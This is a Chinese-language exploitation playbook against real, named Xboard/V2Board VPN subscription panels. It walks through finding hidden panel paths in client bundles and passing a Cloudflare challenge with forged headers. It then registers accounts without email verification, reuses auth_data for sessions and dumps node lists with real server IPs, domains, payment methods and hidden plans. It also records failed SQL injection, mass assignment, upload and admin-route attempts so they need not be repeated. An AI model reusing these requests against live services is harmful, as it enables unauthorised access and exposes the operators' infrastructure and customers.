# Xboard/V2Board 机场面板完整利用链（实测案例 2026-09-26）

目标族：八爪鱼/影猫/太子/云梯等品牌矩阵的订阅面板（前端 Vue SPA，后端 Laravel = Xboard/V2Board 系）。
入口隐藏在同一品牌矩阵的 **PC 客户端配置**里。

## 0. 找面板入口（不是从官网进）
- 客户端 web 根 `publiccon/config.js` / APK `assets/*.js` / Tauri bundle 里的 `airport` 字段：
  `https://www.<品牌>app.cc/<16位随机路径>/login`（路径前缀随机，扫目录扫不到）。
- CF JS 挑战页（`bzyjsq.cc` 那类）用导航头过：`Sec-Fetch-Mode: navigate`、`Sec-Fetch-Site: none`、
  `Sec-Fetch-User: ?1`、`Sec-Fetch-Dest: document`、`Upgrade-Insecure-Requests: 1`。

## 1. API 前缀与产品指纹（未授权）
```
GET <hidden_prefix>/api/v1/guest/comm/config
→ {"data":{"is_email_verify":1,"email_whitelist_suffix":["gmail.com","qq.com","163.com",…],"is_invite_force":0,…}}
```
`is_email_verify:1` 但下一节的 enroll 不校验 —— **别被这个开关骗住**，直接实测 enroll。

## 2. 免验证码开号（逻辑洞）
```
POST <prefix>/api/v1/passport/auth/enroll
Content-Type: application/json
{"email":"<EMAIL-REDACTED>","password":"Test123456","invite_code":"b2sIBBjn","email_code":"000000"}
→ {"data":{"token":"123"}}          # token 是占位符,别当会话用
重复同一 email → 「邮箱已存在系统中」    # 证明账号已创建
```
用白名单后缀（qq.com/163.com/126.com）任造邮箱即可，**不调用 sendEmailVerify、不收信**（避免给陌生人发信）。

## 3. 登录与会话（关键坑）
```
POST <prefix>/api/v1/passport/auth/login  {"email":…,"password":…}
→ {"data":{"token":"6add72b0…","auth_data":"YmF6eUB…"}}   # auth_data = base64("email:$2y$10$…")
GET <prefix>/api/v1/user/info   Authorization: <auth_data>     → 200 真数据
                              Authorization: <token>          → 403「鉴权失败，请重新登入」
```
口令校验 **≥8 位**（`密码必须大于8个字符` = 422），默认短口令 `admin` 提交不进去，别误判。
`<EMAIL-REDACTED>` 存在与否无 oracle（回包一致），定向尝试 ≤ 3~5 次即止。

## 4. 战果：节点表（真实服务器 IP）
```
GET <prefix>/api/v1/user/server/fetch   Authorization: <auth_data>
→ [{"id":68,"group_id":["12","6","1","5"],"name":"🇭🇰香港-联通-高速-B0",
    "host":"bzyrb1.kuaifei.net","out_host":"45.202.219.40","port":11013,
    "cipher":"chacha20-ietf-poly1305","tags":["node:境内使…"]}, …]
```
- 一次拿全：**41 节点 / 22 个真实 IP**（港/日/韩/德/新/台/马/美/西/加），节点域名统一 `bzyrb1|bzyrb2|bzyok.kuaifei.net`
- 分页/组参数（`group_id[]=`）传了也不额外吐节点 → 组过滤没做越权，别硬试
- `GET /user/getSubscribe` → `https://tow3c.<品牌>app.cc/api/v1/client/subscribe?token=…`（**新域名**，128KB AES 密文，需 APP_KEY，放弃解密）
- `GET /user/comm/config` → `withdraw_methods:["支付宝","USDT","Paypal"]`、`is_telegram:0`、`stripe_pk:null`
- `GET /user/order/getPaymentMethod` → `[{"id":13,"name":"支付宝和微信","payment":"EPay"}]`（易支付聚合）
- `GET /user/plan/fetch?id=1` → 泄露 `show:0` 的隐藏套餐「9元体验套餐(20G)」

## 5. 负结果（已实测，别重复投入）
| 尝试 | 结果 |
|---|---|
| `/user/order/detail?id=1..2`、trade_no 猜号 | 404（要真实 trade_no，不可枚举） |
| `/user/invite/details`、`/user/ticket/fetch`、`/user/order/fetch` | 200 空列表，只回本人数据 |
| 批量赋值 `/user/update`·`/user/save`·`/user/profile/save` 等 10 个候选塞 `is_admin/is_staff/balance` | `/user/update` 回 `{"data":true}` 但 `/user/info` 复核无变化；其余 404/405 |
| SQLi：`knowledge/fetch?id=`、`plan/fetch?id=` 注入 `'` / `and 1=1` / `union select` | 响应完全一致（强类型化） |
| `/common/upload`（file/image/upload × .txt/.png/.php/.phtml） | 404，该路由属 admin SPA，不在用户前缀下 |
| `<prefix>/api/v1/admin/*` | 403「权限不足」（用户会话无 admin 角色） |

## 6. 代码侧小坑
- 用 Python `urllib` 打这些接口前 **清掉 `*_proxy` 环境变量**（本机常驻 Tor/全局代理会污染）；
  或 `install_opener(build_opener(ProxyHandler({})))`。
- 同一脚本里 `import urllib.parse` 写进函数体会遮蔽模块名 → `AttributeError`，导入一律放文件顶部。
- 出现「同一批请求突然全回 SPA HTML」先换新会话重试（本次是瞬时问题，不是封禁）。
